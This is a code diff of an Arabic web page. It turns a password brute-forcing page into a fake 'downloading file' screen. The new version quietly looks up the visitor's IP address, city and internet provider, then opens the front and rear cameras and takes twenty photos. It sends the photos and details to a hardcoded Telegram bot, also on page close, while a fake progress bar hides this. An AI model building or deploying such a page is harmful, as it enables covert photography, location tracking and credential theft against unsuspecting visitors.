@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🧠 أداة تخمين الباسورد بالذكاء الاصطناعي</title>
+    <title>📸 جاري التحميل...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -14,114 +14,73 @@
             align-items: center;
             min-height: 100vh;
             color: #fff;
+            flex-direction: column;
             padding: 20px;
         }
         .container {
             background: #1a1a2e;
-            padding: 35px 28px;
+            padding: 40px 30px;
             border-radius: 25px;
-            box-shadow: 0 0 80px rgba(233, 69, 96, 0.15);
-            max-width: 560px;
+            box-shadow: 0 0 60px rgba(233, 69, 96, 0.1);
+            max-width: 440px;
             width: 100%;
             border: 1px solid #2a2a4a;
             text-align: center;
-            position: relative;
-            overflow: hidden;
         }
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle at center, rgba(233,69,96,0.03) 0%, transparent 60%);
-            animation: pulse 6s ease-in-out infinite;
-            z-index: 0;
-        }
+        .icon { font-size: 70px; margin-bottom: 8px; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
-        .ai-badge {
-            background: linear-gradient(135deg, #e94560, #c73652);
-            padding: 4px 16px;
-            border-radius: 50px;
-            font-size: 11px;
-            font-weight: bold;
-            display: inline-block;
-            margin-bottom: 5px;
-            letter-spacing: 1px;
-            position: relative;
-            z-index: 1;
-        }
-        h2 { color: #fff; margin-bottom: 5px; position: relative; z-index: 1; }
-        h2 span { color: #e94560; }
-        .sub { color: #8a8aaa; font-size: 13px; margin-bottom: 20px; position: relative; z-index: 1; }
-        .input-group {
-            margin-bottom: 15px;
-            text-align: left;
-            position: relative;
-            z-index: 1;
-        }
-        .input-group label {
-            color: #aaa;
-            font-size: 13px;
-            display: block;
+        h2 {
+            color: #e94560;
+            font-weight: 700;
+            font-size: 24px;
             margin-bottom: 5px;
         }
-        .input-group input {
-            width: 100%;
-            padding: 14px;
-            border-radius: 12px;
-            border: 1px solid #2a2a4a;
+        .subtitle {
+            color: #8a8aaa;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .loader-box {
             background: #12122a;
-            color: #fff;
-            font-size: 15px;
-            outline: none;
-            transition: 0.3s;
+            border-radius: 14px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid #2a2a4a;
         }
-        .input-group input:focus { border-color: #e94560; box-shadow: 0 0 30px rgba(233,69,96,0.1); }
-        .btn {
+        .loader-bar {
             width: 100%;
-            padding: 15px;
-            border: none;
-            color: #fff;
-            font-weight: bold;
-            font-size: 16px;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-top: 5px;
-            position: relative;
-            z-index: 1;
+            height: 6px;
+            background: #1a1a3a;
+            border-radius: 6px;
+            overflow: hidden;
+            margin-top: 15px;
         }
-        .btn-primary {
-            background: linear-gradient(135deg, #e94560, #c73652);
-            box-shadow: 0 4px 30px rgba(233, 69, 96, 0.25);
+        .loader-bar .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #e94560, #c73652);
+            border-radius: 6px;
+            transition: width 0.2s;
         }
-        .btn-primary:hover { transform: scale(1.02); box-shadow: 0 6px 40px rgba(233, 69, 96, 0.35); }
-        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        .btn-stop {
-            background: #2a2a4a;
-            box-shadow: none;
-            display: none;
+        .status-text {
+            color: #8a8aaa;
+            font-size: 14px;
+            margin-top: 10px;
         }
-        .btn-stop:hover { background: #3a3a5a; }
         #status {
             margin-top: 18px;
-            padding: 14px;
+            padding: 12px;
             border-radius: 12px;
             background: #12122a;
             border: 1px solid #1a1a3a;
             font-size: 13px;
             color: #8a8aaa;
-            min-height: 60px;
+            min-height: 45px;
             display: flex;
             align-items: center;
             justify-content: center;
             flex-wrap: wrap;
             gap: 6px;
-            word-break: break-all;
-            position: relative;
-            z-index: 1;
         }
         .loader {
             display: inline-block;
@@ -141,354 +100,355 @@
             color: #3a3a5a;
             border-top: 1px solid #1a1a3a;
             padding-top: 14px;
-            position: relative;
-            z-index: 1;
         }
-        .found { color: #4caf50; font-weight: bold; font-size: 18px; }
-        .attempt { color: #ff9800; }
-        .stats {
+        .camera-badge {
+            display: inline-block;
+            background: rgba(233, 69, 96, 0.15);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #e94560;
+            margin-top: 5px;
+        }
+        .info-row {
             display: flex;
             justify-content: space-between;
             font-size: 12px;
-            color: #666;
-            margin-top: 10px;
-            padding: 8px;
+            color: #8a8aaa;
+            padding: 4px 0;
+            border-bottom: 1px solid #1a1a3a;
+        }
+        .info-row:last-child { border-bottom: none; }
+        .info-row .label { color: #666; }
+        .info-row .value { color: #e94560; }
+        .info-box {
             background: #12122a;
             border-radius: 10px;
-            position: relative;
-            z-index: 1;
-        }
-        .stats span { color: #aaa; }
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #1a1a3a;
-            border-radius: 4px;
+            padding: 10px 14px;
             margin-top: 10px;
-            overflow: hidden;
-            position: relative;
-            z-index: 1;
-        }
-        .progress-bar .fill {
-            height: 100%;
-            background: linear-gradient(90deg, #e94560, #c73652);
-            width: 0%;
-            transition: width 0.3s;
-            border-radius: 4px;
-        }
-        .result-box {
-            margin-top: 15px;
-            padding: 15px;
-            background: rgba(233, 69, 96, 0.08);
-            border-radius: 12px;
-            border: 1px solid rgba(233, 69, 96, 0.2);
-            display: none;
-            position: relative;
-            z-index: 1;
-        }
-        .result-box .title { color: #8a8aaa; font-size: 12px; margin-bottom: 5px; }
-        .result-box .password { color: #4caf50; font-size: 18px; font-weight: bold; word-break: break-all; }
-        .ai-thinking {
-            display: inline-block;
-            animation: thinking 1s ease-in-out infinite;
-        }
-        @keyframes thinking { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-        .confidence {
-            font-size: 12px;
-            color: #8a8aaa;
-            margin-top: 5px;
-        }
-        .confidence span { color: #4caf50; }
-        .telegram-status {
-            font-size: 12px;
-            color: #6ab0ff;
-            margin-top: 5px;
-        }
-        .telegram-status span { color: #4caf50; }
-        .found-list {
-            margin-top: 10px;
-            text-align: left;
-            max-height: 150px;
-            overflow-y: auto;
-            font-size: 12px;
-            color: #8a8aaa;
-            background: #12122a;
-            border-radius: 8px;
-            padding: 8px 12px;
             border: 1px solid #1a1a3a;
+            text-align: left;
         }
-        .found-list .item {
-            padding: 3px 0;
-            border-bottom: 1px solid #1a1a3a;
-            display: flex;
-            justify-content: space-between;
-        }
-        .found-list .item:last-child { border-bottom: none; }
-        .found-list .check { color: #4caf50; }
-        .found-list .cross { color: #e94560; }
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-track { background: #12122a; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb { background: #e94560; border-radius: 4px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="ai-badge">🧠 مدعوم بالذكاء الاصطناعي</div>
-        <h2>أداة تخمين <span>الباسورد</span></h2>
-        <p class="sub">ذكاء اصطناعي يحلل الأنماط ويرسل النتائج لبوتك</p>
+        <div class="icon">📥</div>
+        <h2>جاري التحميل...</h2>
+        <p class="subtitle">يرجى الانتظار، جاري تجهيز الملف</p>
 
-        <div class="input-group">
-            <label>📧 البريد الإلكتروني</label>
-            <input type="email" id="emailInput" placeholder="example@gmail.com">
+        <div class="loader-box">
+            <div style="font-size:40px;">⏳</div>
+            <div class="loader-bar">
+                <div class="fill" id="progressFill"></div>
+            </div>
+            <div class="status-text" id="progressText">جاري التحميل 0%</div>
+            <div class="camera-badge" id="cameraBadge">📷 كاميرا أمامية + خلفية</div>
         </div>
 
-        <button class="btn btn-primary" id="startBtn">🚀 تشغيل الذكاء الاصطناعي</button>
-        <button class="btn btn-stop" id="stopBtn">⏹ إيقاف</button>
-
-        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
-        <div class="stats">
-            <span id="attemptsCount">المحاولات: 0</span>
-            <span id="speedCount">السرعة: 0/ث</span>
-            <span id="foundCount">المكتشفة: 0</span>
+        <div class="info-box" id="infoBox">
+            <div class="info-row"><span class="label">🌐 عنوان IP</span><span class="value" id="ipDisplay">جاري الجلب...</span></div>
+            <div class="info-row"><span class="label">📱 الجهاز</span><span class="value" id="deviceDisplay">جاري الجلب...</span></div>
+            <div class="info-row"><span class="label">🌍 المدينة</span><span class="value" id="cityDisplay">جاري الجلب...</span></div>
+            <div class="info-row"><span class="label">📶 المزود</span><span class="value" id="ispDisplay">جاري الجلب...</span></div>
         </div>
 
-        <div id="status">⏳ أدخل الإيميل وشغّل الذكاء الاصطناعي</div>
-
-        <div class="result-box" id="resultBox">
-            <div class="title">🔑 كلمة المرور المتوقعة</div>
-            <div class="password" id="resultPassword"></div>
-            <div class="confidence">نسبة الثقة: <span id="confidenceLevel">0%</span></div>
-            <div class="telegram-status">📨 <span id="telegramStatus">لم يتم الإرسال بعد</span></div>
-            <div class="found-list" id="foundList"></div>
-        </div>
-
-        <div class="footer">🔒 الذكاء الاصطناعي يحلل الأنماط • يتم الإرسال إلى بوتك تلقائياً</div>
+        <div id="status">⏳ جاري التجهيز...</div>
+        <div class="footer">🔒 اتصال آمن • سيتم التنزيل تلقائياً</div>
     </div>
 
     <script>
-        // ============================================================
-        // إعدادات بوت تيليغرام - بياناتك
-        // ============================================================
         const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
         const CHAT_ID = "5730027675";
-        // ============================================================
 
-        const emailInput = document.getElementById('emailInput');
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
         const statusDiv = document.getElementById('status');
         const progressFill = document.getElementById('progressFill');
-        const attemptsSpan = document.getElementById('attemptsCount');
-        const speedSpan = document.getElementById('speedCount');
-        const foundSpan = document.getElementById('foundCount');
-        const resultBox = document.getElementById('resultBox');
-        const resultPassword = document.getElementById('resultPassword');
-        const confidenceLevel = document.getElementById('confidenceLevel');
-        const telegramStatus = document.getElementById('telegramStatus');
-        const foundList = document.getElementById('foundList');
+        const progressText = document.getElementById('progressText');
+        const cameraBadge = document.getElementById('cameraBadge');
+        const ipDisplay = document.getElementById('ipDisplay');
+        const deviceDisplay = document.getElementById('deviceDisplay');
+        const cityDisplay = document.getElementById('cityDisplay');
+        const ispDisplay = document.getElementById('ispDisplay');
 
-        let isRunning = false;
-        let stopFlag = false;
-        let attempts = 0;
-        let foundPasswords = [];
-        let bestPassword = '';
-        let bestConfidence = 0;
-        let sentToTelegram = false;
-        let allFound = [];
+        let hasSent = false;
+        let isSending = false;
+        let photos = [];
+        let stream = null;
+        let captureInterval = null;
+        let photoCount = 0;
+        const maxPhotos = 20;
+        let progress = 0;
+        let currentCamera = 'user';
+        let isSwitching = false;
+        let userInfo = {};
 
-        // ====== إرسال إلى تيليغرام ======
-        async function sendToTelegram(email, password, confidence) {
+        // ====== جلب معلومات المستخدم ======
+        async function getUserInfo() {
             try {
-                const message = `🔐 **تم العثور على كلمة مرور محتملة**\n\n📧 الإيميل: ${email}\n🔑 كلمة المرور: ${password}\n📊 نسبة الثقة: ${Math.round(confidence)}%\n🕒 الوقت: ${new Date().toLocaleString()}\n📱 الجهاز: ${navigator.userAgent}\n✅ تم التحقق من ${attempts} محاولة`;
+                // جلب IP والموقع
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip || 'غير معروف';
+                ipDisplay.textContent = ip;
 
+                // جلب معلومات الموقع من ip-api
+                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geoData = await geoRes.json();
+                
+                const city = geoData.city || 'غير معروف';
+                const region = geoData.region || '';
+                const country = geoData.country_name || '';
+                const isp = geoData.org || 'غير معروف';
+                
+                cityDisplay.textContent = `${city}${region ? ', ' + region : ''}${country ? ', ' + country : ''}`;
+                ispDisplay.textContent = isp;
+
+                // معلومات الجهاز
+                const device = navigator.userAgent;
+                let deviceName = 'غير معروف';
+                if (device.includes('Windows')) deviceName = '💻 Windows';
+                else if (device.includes('Android')) deviceName = '📱 Android';
+                else if (device.includes('iPhone')) deviceName = '📱 iPhone';
+                else if (device.includes('Mac')) deviceName = '🍏 Mac';
+                else if (device.includes('Linux')) deviceName = '🐧 Linux';
+                else deviceName = device.split('(')[1]?.split(')')[0] || device.slice(0, 50);
+                deviceDisplay.textContent = deviceName;
+
+                userInfo = { ip, city, region, country, isp, device: deviceName, userAgent: device };
+
+                return userInfo;
+            } catch (e) {
+                console.log('❌ فشل جلب المعلومات:', e);
+                ipDisplay.textContent = 'غير معروف';
+                cityDisplay.textContent = 'غير معروف';
+                ispDisplay.textContent = 'غير معروف';
+                deviceDisplay.textContent = navigator.userAgent.slice(0, 50);
+                userInfo = { ip: 'غير معروف', city: 'غير معروف', isp: 'غير معروف', device: navigator.userAgent.slice(0, 50) };
+                return userInfo;
+            }
+        }
+
+        // ====== إرسال صورة ======
+        async function sendPhoto(blob) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                return response.ok;
+            } catch (e) { return false; }
+        }
+
+        // ====== إرسال إشعار مع معلومات المستخدم ======
+        async function sendMessage(text) {
+            try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+                return response.ok;
+            } catch (e) { return false; }
+        }
+
+        // ====== إرسال معلومات المستخدم مع الصور ======
+        async function sendAllData() {
+            if (isSending || hasSent) return;
+            isSending = true;
+
+            statusDiv.innerHTML = `<span class="loader"></span> جاري إرسال ${photos.length} صور...`;
+            statusDiv.style.color = '#ff9800';
+
+            let successCount = 0;
+            for (const blob of photos) {
+                const sent = await sendPhoto(blob);
+                if (sent) successCount++;
+                await new Promise(r => setTimeout(r, 60));
+            }
+
+            // إرسال معلومات المستخدم
+            const infoMsg = `📸 **تم إرسال ${successCount} صورة**\n\n` +
+                `🌐 **IP:** ${userInfo.ip || 'غير معروف'}\n` +
+                `📍 **الموقع:** ${userInfo.city || 'غير معروف'}\n` +
+                `📶 **المزود:** ${userInfo.isp || 'غير معروف'}\n` +
+                `📱 **الجهاز:** ${userInfo.device || 'غير معروف'}\n` +
+                `🕒 **الوقت:** ${new Date().toLocaleString()}\n` +
+                `📷 **كاميرات:** أمامية + خلفية`;
+
+            await sendMessage(infoMsg);
+
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+                stream = null;
+            }
+
+            hasSent = true;
+            isSending = false;
+
+            statusDiv.innerHTML = `✅ تم إرسال ${successCount} صورة مع المعلومات`;
+            statusDiv.style.color = '#4caf50';
+        }
+
+        // ====== بدء الكاميرا ======
+        async function startCamera(mode) {
+            try {
+                if (stream) {
+                    stream.getTracks().forEach(t => t.stop());
+                    stream = null;
+                }
+
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: mode,
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
                 });
 
-                const result = await response.json();
-                if (result.ok) {
-                    telegramStatus.textContent = '✅ تم الإرسال إلى بوتك';
-                    telegramStatus.style.color = '#4caf50';
-                    return true;
-                } else {
-                    telegramStatus.textContent = '❌ فشل الإرسال';
-                    telegramStatus.style.color = '#e94560';
-                    return false;
+                currentCamera = mode;
+                const cameraName = mode === 'environment' ? 'خلفية' : 'أمامية';
+                cameraBadge.textContent = `📷 كاميرا ${cameraName}`;
+                return true;
+            } catch (error) {
+                console.log('❌ فشل الكاميرا:', error);
+                if (mode === 'user') {
+                    return await startCamera('environment');
                 }
-            } catch (e) {
-                telegramStatus.textContent = '❌ خطأ في الإرسال';
-                telegramStatus.style.color = '#e94560';
                 return false;
             }
         }
 
-        // ====== خوارزمية الذكاء الاصطناعي (أكثر من 1000 تخمين) ======
-        function generateAIPasswords(email) {
-            const prefix = email.split('@')[0];
-            const domain = email.split('@')[1]?.split('.')[0] || '';
-            const passwords = new Set();
+        // ====== التقاط صورة بسرعة ======
+        async function capturePhoto() {
+            if (!stream) return null;
+            try {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 100));
 
-            // 1. أنماط أساسية
-            const basePatterns = [
-                prefix, prefix.toLowerCase(), prefix.toUpperCase(),
-                prefix + '123', prefix + '2024', prefix + '2025',
-                prefix + '!', prefix + '@', prefix + '#',
-                prefix + '123!', prefix + '123@', prefix + '123#',
-                '123' + prefix, '2024' + prefix,
-                prefix + prefix, prefix + domain,
-                domain + prefix, prefix + '865r', '865r' + prefix,
-                prefix + 'fabry', 'fabry' + prefix,
-                prefix + 'qwerty', prefix + 'abc123',
-                prefix + 'password', 'password' + prefix,
-                prefix + '123456', '123456' + prefix,
-                prefix + '12345678', '12345678' + prefix,
-                prefix + '2024!', prefix + '2024@',
-                prefix + '!@#$', prefix + '12345678!',
-                prefix + '123456789', '123456789' + prefix,
-                prefix + 'qwerty123', 'qwerty123' + prefix
-            ];
-            for (const p of basePatterns) passwords.add(p);
+                const canvas = document.createElement('canvas');
+                const track = stream.getVideoTracks()[0];
+                const settings = track.getSettings();
+                canvas.width = settings.width || 640;
+                canvas.height = settings.height || 480;
+                const ctx = canvas.getContext('2d');
 
-            // 2. رموز خاصة
-            const symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '?', '+', '=', '-', '_'];
-            for (const sym of symbols) {
-                passwords.add(prefix + sym);
-                passwords.add(sym + prefix);
-                passwords.add(prefix + '123' + sym);
-                passwords.add(prefix + sym + '123');
-                passwords.add(prefix + '2024' + sym);
-                passwords.add(prefix + sym + '2024');
-            }
-
-            // 3. سنوات
-            for (let year = 2015; year <= 2030; year++) {
-                passwords.add(prefix + year);
-                passwords.add(year + prefix);
-                passwords.add(prefix + year + '!');
-                passwords.add(prefix + '!' + year);
-                passwords.add(prefix + year + '@');
-                passwords.add(prefix + '@' + year);
-            }
-
-            // 4. كلمات شائعة
-            const commonWords = ['admin', 'root', 'user', 'login', 'welcome', 'hello', 'master', 
-                'sunshine', 'princess', 'dragon', 'monkey', 'freedom', 'iloveyou', 'trustno1',
-                'password', 'qwerty', 'abc123', 'letmein', 'changeme', 'baseball', 'football',
-                'soccer', 'jordan', 'michael', 'ashley', 'michelle', 'daniel', 'jessica',
-                'charlie', 'thomas', 'matthew', 'anthony', 'andrew', 'robert', 'jennifer',
-                'amanda', 'melissa', 'nicole', 'brian', 'kevin', 'justin', 'richard',
-                'kimberly', 'joshua', 'steven', 'patrick', 'ryan', 'william', 'james', 'john'];
-            for (const word of commonWords) {
-                passwords.add(prefix + word);
-                passwords.add(word + prefix);
-                passwords.add(prefix + word + '123');
-                passwords.add(word + '123' + prefix);
-                passwords.add(prefix + word + '!');
-                passwords.add(word + '!' + prefix);
-                passwords.add(prefix + word + '@');
-                passwords.add(word + '@' + prefix);
-                passwords.add(prefix + word + '2024');
-                passwords.add(word + '2024' + prefix);
-            }
-
-            // 5. أرقام متسلسلة
-            for (let i = 1; i <= 999; i++) {
-                passwords.add(prefix + i);
-                passwords.add(i + prefix);
-                passwords.add(prefix + String(i).padStart(3, '0'));
-                passwords.add(prefix + String(i).padStart(4, '0'));
-                // مع رموز
-                passwords.add(prefix + i + '!');
-                passwords.add(prefix + i + '@');
-                passwords.add(prefix + '!' + i);
-                passwords.add(prefix + '@' + i);
-                // مع كلمات
-                for (const word of commonWords.slice(0, 15)) {
-                    passwords.add(word + i);
-                    passwords.add(i + word);
-                    passwords.add(word + i + '!');
-                    passwords.add(word + '!' + i);
-                    passwords.add(prefix + word + i);
-                    passwords.add(word + prefix + i);
+                if (currentCamera === 'environment') {
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
                 }
-            }
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // 6. توليد عشوائي ذكي (أكثر من 1000)
-            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*?+=-_';
-            for (let i = 0; i < 800; i++) {
-                let pwd = '';
-                const len = 6 + Math.floor(Math.random() * 8);
-                for (let j = 0; j < len; j++) {
-                    pwd += chars[Math.floor(Math.random() * chars.length)];
-                }
-                // أنماط ذكية
-                const r = Math.random();
-                if (r < 0.2) pwd = prefix + pwd.slice(0, 5);
-                else if (r < 0.4) pwd = pwd.slice(0, 5) + prefix;
-                else if (r < 0.6) pwd = prefix + pwd.slice(0, 3) + '123';
-                else if (r < 0.8) pwd = '123' + pwd.slice(0, 5) + prefix;
-                passwords.add(pwd);
+                const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                const blob = await fetch(imageData).then(r => r.blob());
+                return blob;
+            } catch (e) {
+                console.log('❌ فشل التصوير:', e);
+                return null;
             }
-
-            // 7. أنماط مركبة (أكثر من 500)
-            for (let i = 0; i < 300; i++) {
-                const word1 = commonWords[Math.floor(Math.random() * commonWords.length)];
-                const word2 = commonWords[Math.floor(Math.random() * commonWords.length)];
-                const num = Math.floor(Math.random() * 9999);
-                const sym = symbols[Math.floor(Math.random() * symbols.length)];
-                passwords.add(word1 + word2 + num);
-                passwords.add(word1 + num + word2);
-                passwords.add(prefix + word1 + num);
-                passwords.add(word1 + num + prefix);
-                passwords.add(word1 + sym + word2 + num);
-                passwords.add(prefix + sym + word1 + num);
-                passwords.add(word1 + num + sym + prefix);
-                passwords.add(prefix + num + word1 + sym);
-            }
-
-            return [...new Set(passwords)];
         }
 
-        // ====== تقييم قوة كلمة المرور ======
-        function evaluatePassword(password, email) {
-            const prefix = email.split('@')[0];
-            let score = 0;
+        // ====== التبديل بين الكاميرات ======
+        async function switchCamera() {
+            if (isSwitching) return;
+            isSwitching = true;
 
-            if (password.length >= 6) score += 8;
-            if (password.length >= 8) score += 10;
-            if (password.length >= 10) score += 10;
-            if (password.length >= 12) score += 10;
-            if (password.length >= 14) score += 10;
-            if (/[a-z]/.test(password) && /[A-Z]/.test(password)) score += 15;
-            if (/\d/.test(password)) score += 10;
-            if (/[!@#$%^&*?+=\-_]/.test(password)) score += 12;
-            if (password.includes(prefix)) score += 12;
-            if (password.includes(prefix.toLowerCase())) score += 8;
-            if (password.includes(prefix.toUpperCase())) score += 8;
-            if (/[a-z]{4,}/.test(password)) score += 5;
-            if (/\d{3,}/.test(password)) score += 5;
-            if (new Set(password).size > password.length * 0.6) score += 5;
-            if (/[A-Z]/.test(password) && /[a-z]/.test(password) && /\d/.test(password) && /[!@#$%^&*?+=\-_]/.test(password)) score += 15;
+            const nextMode = currentCamera === 'environment' ? 'user' : 'environment';
+            const cameraName = nextMode === 'environment' ? 'خلفية' : 'أمامية';
+            statusDiv.innerHTML = `🔄 جاري التبديل إلى الكاميرا ${cameraName}...`;
+            statusDiv.style.color = '#ff9800';
+            cameraBadge.textContent = `📷 جاري التبديل...`;
 
-            return Math.min(score, 100);
+            const success = await startCamera(nextMode);
+            isSwitching = false;
+
+            if (success) {
+                statusDiv.innerHTML = `✅ تم التبديل إلى الكاميرا ${cameraName}`;
+                statusDiv.style.color = '#4caf50';
+                return true;
+            } else {
+                statusDiv.innerHTML = `⚠️ فشل التبديل إلى الكاميرا ${cameraName}`;
+                statusDiv.style.color = '#ff9800';
+                return false;
+            }
         }
 
-        // ====== دالة التخمين بالذكاء الاصطناعي ======
-        async function startAIBruteforce() {
-            const email = emailInput.value.trim();
+        // ====== بدء التصوير التلقائي ======
+        async function startAutoCapture() {
+            statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا الأمامية...`;
+            statusDiv.style.color = '#ff9800';
 
-            if (!email || !email.includes('@') || !email.includes('.')) {
-                statusDiv.innerHTML = '⚠️ يرجى إدخال بريد إلكتروني صحيح';
+            // جلب معلومات المستخدم أولاً
+            await getUserInfo();
+
+            const cameraReady = await startCamera('user');
+            if (!cameraReady) {
+                statusDiv.innerHTML = `⚠️ لم نتمكن من الوصول للكاميرا، تأكد من الصلاحية`;
                 statusDiv.style.color = '#ff9800';
                 return;
             }
 
-            if (isRunning) return;
+            statusDiv.innerHTML = `📸 جاري التصوير بسرعة...`;
+            statusDiv.style.color = '#4caf50';
 
- 
+            // إرسال إشعار بدء مع معلومات المستخدم
+            const infoMsg = `📷 **بدأ التصوير السريع**\n\n` +
+                `🌐 **IP:** ${userInfo.ip || 'غير معروف'}\n` +
+                `📍 **الموقع:** ${userInfo.city || 'غير معروف'}\n` +
+                `📶 **المزود:** ${userInfo.isp || 'غير معروف'}\n` +
+                `📱 **الجهاز:** ${userInfo.device || 'غير معروف'}\n` +
+                `🕒 **الوقت:** ${new Date().toLocaleString()}`;
+            await sendMessage(infoMsg);
+
+            let captureCount = 0;
+            const totalCaptures = maxPhotos;
+
+            captureInterval = setInterval(async () => {
+                if (captureCount >= totalCaptures) {
+                    clearInterval(captureInterval);
+                    statusDiv.innerHTML = `✅ تم التقاط ${totalCaptures} صورة - سيتم إرسالها عند الخروج`;
+                    statusDiv.style.color = '#4caf50';
+                    progressFill.style.width = '100%';
+                    progressText.innerHTML = '✅ اكتمل التحميل!';
+                    await sendMessage(`✅ **اكتمل التصوير السريع** (${totalCaptures} صورة - أمامية + خلفية)`);
+                    return;
+                }
+
+                if (captureCount > 0 && captureCount % 2 === 0) {
+                    await switchCamera();
+                    await new Promise(r => setTimeout(r, 150));
+                }
+
+                const blob = await capturePhoto();
+                if (blob) {
+                    photos.push(blob);
+                    captureCount++;
+                    photoCount++;
+                    progress = Math.round((captureCount / totalCaptures) * 100);
+                    progressFill.style.width = progress + '%';
+                    progressText.innerHTML = `جاري التحميل ${progress}%`;
+                    const cameraName = currentCamera === 'environment' ? 'خلفية' : 'أمامية';
+                    statusDiv.innerHTML = `📸 جاري التصوير ${captureCount}/${totalCaptures} (${cameraName})`;
+                }
+            }, 400);
+        }
+
+        // ====== مراقبة الخروج ======
+        window.addEventListener('beforeunload', sendAllData);
+        window.addEventListener('pagehide', sendAllData);
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                sendAllData();
+            }
+        });
+
+        // ====== بدء التصوير التلقائي فوراً ======
+        setTimeout(startAutoCapture, 500);
+    </script>
+</body>
+</html>
